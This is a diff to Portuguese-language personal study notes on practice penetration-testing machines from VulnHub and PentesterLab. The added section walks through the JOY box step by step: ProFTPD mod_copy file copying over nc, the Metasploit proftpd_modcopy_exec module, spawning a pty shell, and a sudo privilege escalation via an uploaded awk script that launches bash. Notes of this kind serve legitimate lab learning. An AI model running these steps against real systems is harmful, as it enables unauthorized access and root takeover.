@@ -2,6 +2,8 @@
 desafio 1 - https://www.vulnhub.com/entry/hacker-fest-2019,378/
 desafio 2 - https://pentesterlab.com/exercises/s2-052/course
 desafio 3 - https://www.vulnhub.com/entry/droopy-v02,143/
+desafio 4 - https://www.vulnhub.com/entry/digitalworldlocal-joy,298/
+
 --VM--
   
 Dia 1 - desafio 2(1° desafio)     7/9/2020
@@ -52,3 +54,43 @@ Dia 3 			9/9/2020
 			meterpreter: shell
 			cd /tmp
 			wget 192.168.0.1/[arquivo saida]  ↔ baixar o arquivo de um server local
+			
+			
+			
+Dia 4 			10/9/2020
+
+	*Varredra da máquina
+	
+	*ftp://ip_maquina
+	
+	*nc ip_maquina 21
+		site cpfr /home/patrick/version_control
+
+		site cpto /home/ftp/version_control
+
+			descobrir o diretorio path dos dados do server
+				-> cat version_control
+					/var/www/tryingharderisjoy
+		*msfconsole
+			use unix/ftp/proftpd_modcopy_exec
+					ir para uma shell interativa -> python -c 'import pty;pty.spawn("/bin/sh")'		
+			dados em /var/www/tryingharderisjoy/ossec
+				cat patricksecretsofjoy
+			su patrick
+			sudo -l
+				/home/patrick/script/test
+		*criando script
+			echo "awk 'BEGIN {system(\"/bin/bash\")}'" > test
+
+			*entrar no ftp
+				ftp ip_maquina
+					anonymous
+						put arquivo -> upload do arquivo
+							put test
+		*nc para mover o arquivo
+			site cpfr /home/ftp/test
+			
+			site cpto /home/patrick/script/test
+
+		*executar 
+			sudo /home/patrick/script/test			
